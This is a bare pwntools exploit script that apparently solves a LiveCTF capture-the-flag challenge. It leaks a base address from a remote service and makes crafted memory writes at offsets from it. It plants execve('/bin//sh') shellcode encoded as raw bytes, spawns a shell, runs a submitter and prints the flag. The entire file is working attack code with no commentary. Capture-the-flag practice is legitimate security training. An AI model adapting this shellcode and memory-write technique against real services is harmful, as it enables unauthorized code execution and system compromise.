#!/usr/bin/env python3

from pwn import *

HOST = os.environ.get('HOST', 'localhost')
PORT = 31337

context.arch='amd64'
io = remote(HOST, int(PORT))
base = u64(io.recvn(8))

a,b,c=struct.unpack("<3Q", b"\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x52\x53\x54\x5f\x52\x57\x54\x5e\x0f\x05")

io.send(flat([
    base+0x45c4,0,
    base+0x4330,base+0x1370,
    base+0x4338,base+0x2000,0]))
io.send(p32(0))

io.send(flat([
    base+0x2140,a,
    base+0x2148,b,
    base+0x2150,c,0]))

io.sendline(b'./submitter')
io.recvuntil(b'Correct!\n')
io.readn(8)
flag = io.recvline_contains(b'LiveCTF{').decode().strip()
log.info('%s', flag)
print(flag)
